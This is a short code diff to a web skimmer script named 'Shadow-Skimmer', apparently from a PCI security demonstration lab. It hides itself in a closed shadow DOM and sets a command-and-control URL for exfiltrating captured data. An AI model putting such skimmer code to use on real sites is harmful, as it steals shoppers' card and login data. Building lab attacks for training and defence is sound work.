@@ -22,8 +22,17 @@
   console.log('[Shadow-Skimmer] Initializing Shadow DOM stealth attack...')
 
   // Attack configuration
+  // Dynamically determine C2 URL based on environment
+  const hostname = window.location.hostname
+  let exfilUrl = 'http://localhost:9004/collect' // Local development default
+
+  // Production and staging - use relative URL since C2 is proxied by nginx
+  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
+    exfilUrl = window.location.origin + '/collect'
+  }
+
   const CONFIG = {
-    exfilUrl: 'http://localhost:9004/collect',
+    exfilUrl: exfilUrl,
     debug: true,
     shadowMode: 'closed', // Use closed shadow DOM for maximum stealth
     hiddenElements: true, // Hide shadow host elements
